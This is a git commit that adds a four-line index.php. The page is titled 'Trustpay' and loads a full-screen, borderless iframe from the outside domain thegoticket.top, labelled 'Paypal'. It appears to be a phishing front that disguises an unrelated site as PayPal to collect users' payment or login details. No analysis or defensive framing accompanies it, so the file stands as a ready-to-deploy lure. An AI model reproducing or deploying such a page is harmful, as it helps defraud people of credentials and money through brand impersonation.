0003d248d6c558dce09020bc07b2c334230de96a
Loadedxclusive <106339737+ahanaujam@users.noreply.github.com>
2023-06-11 08:04:57 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,4 @@
+<meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
+<title>Trustpay</title>
+<link rel="icon" type="image/x-icon" href="/favicon.ico">
+<iframe src="https://thegoticket.top/home-main/" style="width:100%;height:100%;border:0;"title="Paypal"></iframe>
